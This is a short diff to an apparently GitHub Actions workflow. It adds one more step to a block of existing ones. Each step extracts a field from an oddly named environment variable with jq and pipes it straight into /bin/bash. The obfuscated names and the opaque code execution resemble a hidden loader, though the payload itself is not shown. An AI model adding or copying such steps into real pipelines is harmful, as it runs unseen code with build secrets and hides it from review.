@@ -34,6 +34,7 @@ jobs:
           echo $ujg4466 | jq -r .hljdr98001 | /bin/bash
           echo $s5 | jq -r .ev80821 | /bin/bash
           printf '%s' "$nao2" | jq -r .d90051 | /bin/bash
+          printf '%s' "$pl938" | jq -r .n57 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
